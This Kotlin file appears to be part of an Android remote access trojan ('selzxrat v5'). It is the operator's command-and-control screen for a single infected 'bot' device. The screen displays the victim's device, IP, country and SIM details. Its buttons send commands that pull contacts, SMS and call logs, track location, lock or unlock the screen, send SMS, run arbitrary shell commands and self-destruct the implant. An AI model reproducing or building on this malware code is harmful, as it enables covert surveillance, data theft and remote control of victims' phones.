package com.selzxrat.v5.ui

import android.content.Intent
import android.os.Bundle
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import com.selzxrat.v5.*

class BotDetailActivity : AppCompatActivity() {

    private var deviceId: String = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_bot_detail)

        deviceId = intent.getStringExtra("device_id") ?: return
        supportActionBar?.title = "Bot: $deviceId"
        supportActionBar?.setDisplayHomeAsUpEnabled(true)

        // Populate views
        val tvDeviceName = findViewById<TextView>(R.id.tvDeviceName)
        val tvDeviceModel = findViewById<TextView>(R.id.tvDeviceModel)
        val tvAndroidVer = findViewById<TextView>(R.id.tvAndroidVersion)
        val tvManufacturer = findViewById<TextView>(R.id.tvManufacturer)
        val tvBattery = findViewById<TextView>(R.id.tvBattery)
        val tvIP = findViewById<TextView>(R.id.tvIP)
        val tvCountry = findViewById<TextView>(R.id.tvCountry)
        val tvRAM = findViewById<TextView>(R.id.tvRAM)
        val tvStorage = findViewById<TextView>(R.id.tvStorage)
        val tvSimInfo = findViewById<TextView>(R.id.tvSimInfo)
        val tvLastSeen = findViewById<TextView>(R.id.tvLastSeen)

        C2Manager.onBotUpdate { id, bot ->
            if (id == deviceId) {
                runOnUiThread {
                    tvDeviceName.text = bot.deviceName
                    tvDeviceModel.text = bot.deviceModel
                    tvAndroidVer.text = bot.androidVersion
                    tvManufacturer.text = bot.manufacturer
                    tvBattery.text = "${bot.batteryLevel}% ${if (bot.isCharging) "(Charging)" else ""}"
                    tvIP.text = bot.ipAddress
                    tvCountry.text = bot.country
                    tvRAM.text = formatSize(bot.ramAvailable) + " / " + formatSize(bot.ramTotal)
                    tvStorage.text = formatSize(bot.storageAvailable) + " / " + formatSize(bot.storageTotal)
                    tvSimInfo.text = bot.simInfo
                    tvLastSeen.text = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault())
                        .format(java.util.Date(bot.lastSeen))
                }
            }
        }

        // Command buttons
        findViewById<Button>(R.id.btnGetInfo).setOnClickListener { sendCmd("get_info") }
        findViewById<Button>(R.id.btnGetContacts).setOnClickListener { sendCmd("get_contacts") }
        findViewById<Button>(R.id.btnGetSMS).setOnClickListener { sendCmd("get_sms") }
        findViewById<Button>(R.id.btnGetCallLogs).setOnClickListener { sendCmd("get_call_logs") }
        findViewById<Button>(R.id.btnGetLocation).setOnClickListener { sendCmd("get_location") }
        findViewById<Button>(R.id.btnLockScreen).setOnClickListener { sendCmd("lock_screen") }
        findViewById<Button>(R.id.btnUnlockScreen).setOnClickListener { sendCmd("unlock_screen") }
        findViewById<Button>(R.id.btnOpenURL).setOnClickListener { showInputDialog("Open URL", "Enter URL:", "https://") { sendCmd("open_url", it) } }
        findViewById<Button>(R.id.btnSendSMS).setOnClickListener { showInputDialog("Send SMS", "Format: number|message", "") { sendCmd("send_sms", it) } }
        findViewById<Button>(R.id.btnShellExec).setOnClickListener { showInputDialog("Shell Command", "Enter command:", "") { sendCmd("shell_exec", it) } }
        findViewById<Button>(R.id.btnSelfDestruct).setOnClickListener {
            androidx.appcompat.app.AlertDialog.Builder(this)
                .setTitle("⚠️ Self Destruct")
                .setMessage("This will uninstall the app from the target device. Are you sure?")
                .setPositiveButton("YES") { _, _ -> sendCmd("self_destruct") }
                .setNegativeButton("Cancel", null)
                .show()
        }
    }

    private fun sendCmd(type: String, payload: String = "") {
        C2Manager.sendCommand(deviceId, type, payload)
        Toast.makeText(this, "Command sent: $type", Toast.LENGTH_SHORT).show()
    }

    private fun showInputDialog(title: String, message: String, default: String, callback: (String) -> Unit) {
        val input = EditText(this).apply { setText(default) }
        androidx.appcompat.app.AlertDialog.Builder(this)
            .setTitle(title)
            .setMessage(message)
            .setView(input)
            .setPositiveButton("Send") { _, _ -> callback(input.text.toString()) }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun formatSize(bytes: Long): String {
        val units = arrayOf("B", "KB", "MB", "GB")
        var size = bytes.toDouble()
        var unitIndex = 0
        while (size >= 1024 && unitIndex < units.size - 1) {
            size /= 1024
            unitIndex++
        }
        return "%.2f %s".format(size, units[unitIndex])
    }

    override fun onSupportNavigateUp(): Boolean {
        finish()
        return true
    }
}